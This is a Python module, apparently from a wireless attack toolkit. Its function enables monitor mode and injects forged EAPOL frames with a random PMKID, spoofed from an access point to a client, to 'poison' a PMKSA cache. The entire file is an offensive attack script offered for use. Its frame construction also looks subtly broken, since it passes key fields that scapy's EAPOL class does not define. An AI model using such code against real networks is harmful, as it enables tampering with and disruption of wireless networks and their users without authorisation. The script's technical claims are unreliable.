#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import scapy.all as scapy
import os
from utils.hardware import interface, monitor_interface, hardware_available, adapter_detected
from utils.interface import enable_monitor_mode, set_channel
from utils.logger import log_capture
from utils.status import print_status


def pmksa_poison(bssid: str, client_mac: str, channel: str = "1", session_id: str = None) -> bool:
    """
    PMKSA cache poisoning – inject forged EAPOL frame with fake PMKID.
    """
    if not hardware_available or not adapter_detected:
        print_status("No USB adapter detected", "error")
        return False

    print_status(f"PMKSA cache poison: {client_mac} -> {bssid}", "info")
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        print_status("Monitor mode failed", "error")
        return False

    if not set_channel(channel):
        return False

    forged_pmkid = os.urandom(16)

    # Build EAPOL frame (simplified but sufficient for poisoning)
    eapol_frame = scapy.EAPOL(
        version=2,
        type=3,
        length=0,
        key_info=0x1480,
        key_length=16,
        key_replay_counter=1,
        key_nonce=b'\x00' * 32,
        key_iv=b'\x00' * 16,
        key_rsc=b'\x00' * 8,
        key_id=b'\x00' * 8,
        key_mic=b'\x00' * 16,
        key_data_length=22
    )

    pkt = scapy.RadioTap() / scapy.Dot11(
        addr1=client_mac,
        addr2=bssid,
        addr3=bssid
    ) / eapol_frame / forged_pmkid

    for _ in range(20):
        scapy.sendp(pkt, iface=mon_iface, count=1, inter=0.1)

    log_capture("pmksa_poison", bssid, "", None)
    print_status(f"PMKSA cache poisoned for {client_mac}", "success")
    return True
